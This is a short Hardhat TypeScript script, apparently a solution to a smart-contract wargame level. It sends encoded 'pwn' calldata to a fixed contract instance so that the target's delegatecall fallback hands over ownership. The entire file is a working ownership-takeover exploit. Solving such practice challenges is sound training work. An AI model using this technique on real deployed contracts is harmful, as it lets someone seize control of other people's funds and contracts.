import { ethers } from "hardhat";

const InstanceAddress = "0x7aBf896DACfD5f162362B30bc1603fEC3adcA8fA";

async function main() {
  const Delegate = await ethers.getContractFactory("Delegate");
  const txData = Delegate.interface.encodeFunctionData("pwn", []);
  const signer = (await ethers.getSigners())[0];
  const functionCall: any = {
    to: InstanceAddress,
    data: txData,
  };
  const gasUse = await ethers.provider.estimateGas(functionCall);
  functionCall.gasLimit = gasUse.add(10000);
  //   console.log(functionCall);
  const tx = await signer.sendTransaction(functionCall);
  await tx.wait();
  console.log("successfully send transaction");
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
